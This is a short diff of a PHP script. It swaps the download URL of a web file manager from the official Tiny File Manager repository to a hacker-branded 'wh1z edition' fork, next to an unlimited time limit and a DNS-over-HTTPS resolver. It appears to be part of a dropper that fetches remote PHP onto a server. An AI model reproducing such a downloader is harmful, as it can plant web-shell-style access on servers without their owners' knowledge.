@@ -2,7 +2,7 @@
 
 set_time_limit(0);
 
-$url = "https://raw.githubusercontent.com/prasathmani/tinyfilemanager/refs/heads/master/tinyfilemanager.php";
+$url = "https://raw.githubusercontent.com/PinoyWH1Z/tinyfilemanager-wh1z-edition/refs/heads/main/tinyfilemanager-wh1z-mini.php";
 
 $dns = "https://cloudflare-dns.com/dns-query";
 
